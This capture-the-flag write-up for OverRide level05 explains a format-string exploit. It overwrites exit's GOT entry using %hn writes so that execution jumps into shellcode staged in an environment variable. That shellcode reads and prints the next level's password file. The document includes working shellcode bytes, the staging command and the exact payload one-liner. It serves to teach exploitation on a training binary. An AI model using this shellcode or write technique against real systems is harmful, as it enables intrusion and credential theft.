# OverRide — Level05 Solution

---

# Part 1 — Understanding the vulnerability

## The bug

`main` reads input with `fgets` and passes that input straight to `printf` as
its format string. A safe program would treat the input as plain data
(`printf("%s", buf)`), but here the input *is* the format string. That means
any format specifiers we type (`%x`, `%n`, …) are interpreted by `printf`
against the stack — letting us read and eventually write memory.

`fgets` caps input at 100 bytes into a 100-byte buffer, so a classic stack
**overflow is impossible**. The format string is the only way in.

## What `%n` does

`%n` is the one format specifier that **writes instead of prints**. When
`printf` reaches a `%n`, it takes the number of characters printed so far and
stores that number into an address — the address it reads from its argument
slot.

Two things we control:

- **Where it writes** = an address we place in our own input (our input is on
  the stack, and `printf` reads its arguments from the stack, so it will pick
  up the address we planted).
- **What it writes** = the running count of characters printed, which we inflate
  with padding like `%55333d` (print a number padded out to 55333 characters).

Together this makes `%n` a **write-anything-anywhere** primitive: we choose the
destination (an address in our buffer) and the value (via padding).

## Where to write: the GOT

When the program calls a libc function, it jumps through the **GOT** (Global
Offset Table). From the disassembly:

```
08048370 <exit@plt>:
 8048370: jmp *0x80497e0      ; exit() is looked up at GOT entry 0x080497e0
```

So if we overwrite the 4 bytes at `0x080497e0`, we control where `exit` jumps.

## Why not overwrite exit → system

The tempting idea is to write `system`'s address into exit's GOT. But look at
how `main` calls exit:

```
804850c: movl $0x0,(%esp)     ; argument hardcoded to 0
8048513: call exit@plt
```

The argument is hardcoded to `0`. Redirecting exit→system would run
`system(0)`, which dereferences a null pointer and crashes. We can't change
that argument, so **system is a dead end.**

## The fix: shellcode

Shellcode is raw machine code that talks to the kernel directly through
syscalls. It needs **no argument passed on the stack**, so the hardcoded `0`
doesn't affect it. We overwrite exit's GOT with the *address of our shellcode*
instead of system.

The shellcode we use opens `/home/users/level06/.pass`, reads it, and prints it
to the screen. Here is the exact shellcode (followed by the path it reads):

```
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass
```

Verified with `objdump -D -b binary -m i386 sc.bin`:

- **65 bytes, no null bytes** (nulls would truncate it as a C string).
- Zeroes registers with `xor reg,reg` to avoid literal `0x00` bytes.
- A `jmp / call / pop` trick fetches the address of the appended path string.
- syscalls: `open` → `read` → `write` to stdout → loop until EOF → `exit`.

## What is a NOP (and why we need one)

**NOP** = "No Operation." It is a single machine instruction (byte `\x90` on
x86) that does nothing: the CPU sees it and moves to the next byte, changing no
registers and no memory.

Line up many NOPs in a row — a **NOP sled** — and if execution jumps into *any*
of them, the CPU slides forward one byte at a time through all the NOPs until
it reaches the real code after them.

We need this because the shellcode's address in the environment drifts between
runs, and especially between a gdb run and a direct run (gdb adds its own
variables, which shifts the stack). Jumping to the exact first byte is brittle
— a few bytes off lands mid-instruction and crashes. By prepending ~200 NOPs
and aiming at the **middle** of the sled, we get ~90 bytes of tolerance in each
direction. Landing anywhere in that window slides down into the shellcode.

## The two-halves problem

The shellcode's address is a 4-byte value like `0xffffd82d`. Writing it with a
single `%n` would require printing ~4 billion characters. So we split it and
use `%hn`, which writes only **2 bytes** (a `short`) at a time:

- low  half → written to `0x080497e0`
- high half → written to `0x080497e2`

Because the character counter used by `%n`/`%hn` **never resets** during a
single `printf`, we must write the **smaller half first**, then pad up to the
larger value.

---

# Part 2 — The exploit, step by step

## Step 1 — Stage the shellcode in an environment variable

Put a NOP sled + the shellcode + the target path into an env var, so it lives
at a findable stack address. This is the exact command used:

```bash
export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'
```

That is 200 NOP bytes (`\x90`), followed by the 65-byte shellcode, followed by
the path `/home/users/level06/.pass` that the shellcode opens.

**Why:** the env var places our shellcode in the process's memory. The NOP sled
in front makes the exact landing address forgiving.

## Step 2 — Find the shellcode's address

In gdb, break at main, run, and dump the environment strings:

```bash
gdb ./level05
(gdb) break main
(gdb) run
(gdb) x/20s *environ
```

`x/20s *environ` prints the environment variables as strings, each with its
address. Find the line that starts with `SHELLCODE=`, for example:

```
0xffffd7be:  "SHELLCODE=\220\220\220...(NOPs)...\061\300\061\333...(shellcode).../home/users/level06/.pass"
```

(`\220` is octal for `0x90`, a NOP; `\061\300` is `\x31\xc0`, the first real
shellcode instruction.)

Now compute the aim point:

1. The string starts at `0xffffd7be`.
2. `SHELLCODE=` is 10 characters, so the NOP sled starts at
   `0xffffd7be + 10 = 0xffffd7c8`.
3. In the dump, the real shellcode (`\061\300` = `\x31\xc0`) begins around
   `0xffffd892`, so the sled runs from `0xffffd7c8` to `0xffffd892` (~200 bytes).
4. Aim at the **middle** of that sled:
   `(0xffffd7c8 + 0xffffd892) / 2 ≈ 0xffffd82d`.

So the aim address is **`0xffffd82d`**.

**Why the middle:** the address measured inside gdb differs slightly from a
direct `./level05` run, because gdb adds its own environment variables and
shifts the stack. Aiming at the middle of the sled leaves ~90 bytes of slack in
each direction, which absorbs that drift so the exploit still lands.

## Step 3 — Identify the write target

From the disassembly, exit's GOT entry is `0x080497e0`. We will write our aim
address into it, two bytes at a time:

- low  half of the aim address → `0x080497e0`
- high half of the aim address → `0x080497e2`

**Why:** overwriting exit's GOT is what redirects the program's final
`exit(0)` into our NOP sled.

## Step 4 — Build the payload

The payload has two parts:

1. **The two target addresses** at the very start of the input, so `printf`
   reads them as arguments (they sit in argument slots 10 and 11):
   `\xe0\x97\x04\x08` (`0x080497e0`) then `\xe2\x97\x04\x08` (`0x080497e2`).

2. **The padding + `%hn` writes** that push the character count up to each half
   of the aim address and write it:

```
[0x080497e0][0x080497e2] %<pad1>d %10$hn %<pad2>d %11$hn
```

The two addresses print 8 characters up front, so:

- `pad1 = low_half  - 8`
- `pad2 = high_half - low_half`   (a difference, since the counter carries over)

For aim address `0xffffd82d` this becomes:

```
\xe0\x97\x04\x08\xe2\x97\x04\x08%55333d%10$hn%10194d%11$hn
```

**Why:** slots 10 and 11 point back to the two addresses at the start of our
input, so `%10$hn` writes the low half to `0x080497e0` and `%11$hn` writes the
high half to `0x080497e2`. The paddings make each `%hn` write the correct byte
values of the aim address.

### What the numbers in the payload actually are (read this if confused)

A common confusion: people expect the payload to contain the addresses of
`system` and `/bin/sh`. **It does not.** There is no `system` and no `/bin/sh`
anywhere in this exploit — the shellcode replaced both.

The payload only has **two kinds of numbers**, and it helps to think of them as
answering two questions: *where do I write?* and *what do I write?*

```
\xe0\x97\x04\x08   \xe2\x97\x04\x08   %55333d %10$hn   %10194d %11$hn
└──── WHERE ────┘  └──── WHERE ────┘  └──── WHAT ───┘  └──── WHAT ───┘
```

**WHERE (the two addresses at the front):**

- `\xe0\x97\x04\x08` = `0x080497e0` → exit's GOT entry (first 2 bytes)
- `\xe2\x97\x04\x08` = `0x080497e2` → exit's GOT entry (last 2 bytes)

These are the **same destination** — exit's GOT slot — just split in two because
we write it 2 bytes at a time. This is the *place* we write to.

**WHAT (the padding numbers):**

- `%55333d` and `%10194d` are not addresses. They just print that many
  characters, which sets the number `%hn` writes.
- Together they encode the **shellcode's aim address** (`0xffffd82d`):
  the first padding builds its low half (`0xd82d`), the second builds its high
  half (`0xffff`).

So the shellcode address is the **value being written** — it is hidden inside
the padding counts, not placed in the payload as raw bytes.

Put simply:

| Part of payload | Number | Meaning |
|---|---|---|
| `\xe0\x97\x04\x08` | `0x080497e0` | WHERE: exit's GOT (low half) |
| `\xe2\x97\x04\x08` | `0x080497e2` | WHERE: exit's GOT (high half) |
| `%55333d` | (prints 55333 chars) | WHAT: builds low half of shellcode address |
| `%10194d` | (prints 10194 more) | WHAT: builds high half of shellcode address |

In one sentence: **we write the shellcode's address (the WHAT, made from the
padding) into exit's GOT (the WHERE, the two addresses at the front).**

## Step 5 — Fire it

```bash
python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55333d%10\$hn' + '%10194d%11\$hn'" | ./level05
```

What happens at runtime:

1. `printf` writes our aim address into exit's GOT (the two `%hn` writes).
2. `main` finishes and runs `call exit`.
3. exit's GOT now points into our NOP sled → execution slides into the shellcode.
4. The shellcode opens and prints `/home/users/level06/.pass`.

Result: **level06's password is printed.**

---

## Why the first attempts segfaulted

The technique was correct all along; the failure was the **shellcode address
being off by a few bytes** between where it was measured (inside gdb) and where
it ran (direct `./level05`). Aiming at a bare address is brittle. The **NOP
sled** turns "hit this exact byte" into "hit anywhere in a 200-byte window,"
which absorbs the drift and makes the exploit reliable.

---

## Summary — the four moving parts

1. **Format string bug** (`printf(buf)`) — gives a read/write into memory.
2. **Shellcode in an env var** — self-contained code that reads the pass; needs
   no argument, so it dodges the hardcoded `exit(0)`.
3. **GOT overwrite** — redirect `exit` (`0x080497e0`) to the shellcode.
4. **`%hn` short writes + padding** — write the 4-byte address two bytes at a
   time, smaller half first; a **NOP sled** makes the target address forgiving.